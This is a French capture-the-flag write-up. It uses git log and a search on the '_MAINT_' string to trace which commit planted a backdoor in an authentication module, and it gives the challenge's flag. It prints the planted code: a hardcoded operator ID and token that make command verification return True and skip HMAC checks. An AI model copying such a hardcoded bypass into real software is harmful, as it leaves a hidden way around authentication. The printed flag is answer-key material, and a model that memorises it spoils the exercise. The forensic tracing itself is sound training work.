# Icare -> Consigne 3 : origine de la porte dérobée

## Objectif

Retrouvez le commit qui introduit la porte dérobée et l'adresse e-mail de son auteur.

## Éléments reçus

Les éléments fournis sont les suivants : 
- R.A.S

## Démarche

1. Inspection du dossier `.git` avec `ls` : présence de `config`, `HEAD`, `index`, `info`, `objects` et `refs`. Les objets de l’historique sont stockés dans `.git/objects/`.
2. Utilisation de `ls -a` pour voir les fichiers et le dossier caché `.git`.
3. Consultation des commits concernant le fichier :

```sh
git log src/tcuplink/auth.py
```

Deux commits apparaissent :

| Commit | Message | Auteur déclaré |
|---|---|---|
| `2e192f32d090bf23007a6563b37c5c219e43c4a1` | `auth: add field-maintenance recovery path` | Camille Roussel `<c.roussel@segment-sol.aae>` |
| `8c820e009386d052d9f838d326085bcff0f58830` | `auth: HMAC command authentication with anti-replay` | Camille Roussel `<c.roussel@segment-sol.aae>` |

4. Recherche du commit modifiant le nombre d’occurrences de `_MAINT_`, avec affichage du diff :

```sh
git log -p -S '_MAINT_' src/tcuplink/auth.py
```

`-S` recherche les changements du nombre d’occurrences de la chaîne, `-p` affiche les différences. Les lignes préfixées par `+` sont ajoutées dans la nouvelle version.

Le diff du commit `2e192f32d090bf23007a6563b37c5c219e43c4a1` montre l’ajout de :

```python
_MAINT_OPERATOR = 0xA5
_MAINT_TOKEN = bytes.fromhex("9e3ab7f04c118d26")
```

et, au début de `verify_command` :

```python
if frame.operator_id == _MAINT_OPERATOR and frame.payload[:8] == _MAINT_TOKEN:
    return True
```

## Conclusion

Le commit identifié ajoute bien les constantes et le retour anticipé qui contourne les contrôles normaux.

- Commit : `2e192f32d090bf23007a6563b37c5c219e43c4a1`.
- Auteur déclaré : Camille Roussel.
- Adresse e-mail : `c.roussel@segment-sol.aae`.
- Date d’auteur affichée : 5 novembre 2026 à 21:14:06 UTC.

Le flag prend l’identifiant complet du commit ayant introduit la vulnérabilité, puis l’adresse e-mail de son auteur déclaré. Les deux valeurs sont séparées par `:` et encadrées par `RM{}` :

```text
RM{2e192f32d090bf23007a6563b37c5c219e43c4a1:c.roussel@segment-sol.aae}
```

**Flag final de l’activité.**

